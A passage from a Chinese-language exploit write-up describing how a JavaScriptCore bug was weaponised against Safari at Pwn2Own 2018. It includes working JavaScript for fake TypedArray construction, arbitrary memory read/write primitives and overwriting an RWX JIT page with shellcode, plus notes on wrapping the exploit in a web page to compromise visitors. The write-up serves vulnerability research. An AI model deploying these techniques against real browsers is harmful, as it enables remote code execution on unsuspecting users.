      for (let i = 0; i < 0x1000; i++) {
          let a = new Float64Array(1);
          // Add a new property to create a new Structure instance.
          a[randomString()] = 1337;
          structs.push(a);
      }
    }
在喷射了大量的TypedArray
ID后，就能构造出一个伪造的TypedArray，并猜出其structureID的值。通过在伪造的TypedArray对象上调用instanceOf函数，我们可以安全地“检查”我们的猜测是否正确。如果instanceof返回值为Float64Array，则说明我们已经创建了一个“有效”的TypedArray对象！
此时，我们可以利用JavaScript访问伪造的TypedArray对象，同时通过utarget控制其后备存储指针。通过操作该TypedArray的后备存储指针，我们就获得了对进程整个地址空间的完全读写权限。
    // Set data at a given address
    prims.set = function(addr, arr) {
        fakearray[2] = addr.asDouble();
        utarget.set(arr);
    }
    // Read 8 bytes as an Int64 at a given address
    prims.read64 = function(addr) {
        fakearray[2] = addr.asDouble();
        let bytes = Array(8);
        for (let i=0; i<8; i++) {
            bytes[i] = utarget[i];
        }
        return new Int64(bytes);
    }
    // Write an Int64 as 8 bytes at a given address
    prims.write64 = function(addr, value) {
        fakearray[2] = addr.asDouble();
        utarget.set(value.bytes);
    }
在任意R/W原语的帮助下，我们就可以实现最终的目标——任意代码执行。
**任意代码执行**
* * *
在MacOS上，Safari/JavaScriptCore仍然会使用具有读/写/执行（RWX）权限的JIT页面。为了实现代码执行，我们只需找到一个具有RWX权限的JIT页面，然后用我们自己的shellcode覆盖它即可。
第一步是找到一个指向[JIT](https://en.wikipedia.org/wiki/Just-in-time_compilation
"JIT")页面的指针。为此，我们创建了一个JavaScript函数对象，并重复使用该对象。这样做的目的，是确保函数对象会将其逻辑编译为机器代码，并在具有RWX权限的JIT页面中分配一个内存区：
    // Build an arbitrary JIT function
    // This was basically just random junk to make the JIT function larger
    let jit = function(x) {
        var j = []; j[0] = 0x6323634;
        return x*5 + x - x*x /0x2342513426 +(x-x+0x85720642*(x+3-x / x+0x41424344)/0x41424344)+j[0]; 
    };
    // Make sure the JIT function has been compiled
    jit();
    jit();
    jit();
    ...
然后，使用我们的任意R/W原语和 addrof(...) 来探测函数对象的jit。一般来说，对象的RWX JIT页面指针可以从函数对象中找到。
今年1月初，JavaScript指针中引入了一个“[指针中毒](https://webkit.org/blog/8048/what-spectre-and-meltdown-mean-for-webkit/
"指针中毒")”漏洞的安全补丁，用以缓解CPU侧信道漏洞"幽灵"的威胁。当然，该补丁的宗旨，并非向具有任意R/W能力的攻击者隐藏指针，所以，我们需要对该对象进行深入挖掘，以找出一个未中毒的JIT指针。
    // Traverse the JSFunction object to retrieve a non-poisoned pointer
    log("Finding jitpage");
    let jitaddr = prims.read64(
        prims.read64(
            prims.read64(
                prims.read64(
                    prims.addrof(jit).add(3*8)
                ).add(3*8)
            ).add(3*8)
        ).add(5*8)
    );
    log("Jit page addr = "+jitaddr);
    ...
现在，我们已经有了一个指向RWX
JIT页面的指针，接下来，只需将它插入伪造的TypedArray的后备存储字段，然后就可执行任意写操作了。最后，我们必须注意shellcode有效载荷的尺寸大小。如果我们复制太多代码的话，可能会在执行任意写操作时无意中“粉碎”了其他JIT函数，从而导致系统不稳定。
    shellcode = [0xcc, 0xcc, 0xcc, 0xcc]
    // Overwrite the JIT code with our INT3s
    log("Writing shellcode over jit page");
    prims.set(jitaddr.add(32), shellcode);
    ...
为了获得代码执行权限，我们只需利用JavaScript调用相应的函数对象即可。
    // Call the JIT function to execute our shellcode
    log("Calling jit function");
    jit();
运行完整的漏洞利用程序可以看到，我们的Trace/Breakpoint（cc shellcode）正在被执行。这意味着我们已经实现了任意代码执行功能。
最终的漏洞利用代码实现了任意代码执行，该代码适用于Ubuntu 16.04上的JavaScriptCore版本
搞定漏洞利用[代码](https://gist.github.com/itszn/5e6354ff7975e65e5867f3a660e23e05
"代码")后，攻击者还有许多工作要做，就是设法将JavaScript嵌入到任何网站中并弹出易受攻击的Safari版本。如果研发时间充足的话，可以将这个漏洞利用代码的成功率提高到99％以上。
最后一步，是使用HTML封装这个基于JavaScript的漏洞利用代码，同时，为了让它在真正的Mac硬件上运行的Apple
Safari上更加可靠，还需要对其做些调整。这样，受害者只要点击了错误的链接或浏览了恶意网站，其浏览器就会被攻击者攻陷。
**结束语**
* * *
由于以前对JavaScriptCore知之甚少，该漏洞从发现到研究、武器化直至稳定化，花了我们将近100个工时。在参加Pwn2Own
2018大会之前，我们专门购买了一台13英寸、处理器为i5的2017 MacBook
Pro机器，对于我们的Safari漏洞利用代码进行了1000多次的测试，成功率为95％左右。
在Pwn2Own 2018大会上，这个JSC漏洞利用代码在四次尝试中，有三次成功搞定13英寸、i7处理器的2017 MacBook
Pro，其中第二次尝试因竞争条件的原因而失败（可能是i7处理器的缘故）。
zero-day链的下一步是逸出Safari沙箱，拿下整个机器。在下一篇文章中，我们将为读者讲解如何对沙箱进行安全审计，进而找出一个能够提升至root权限的安全漏洞。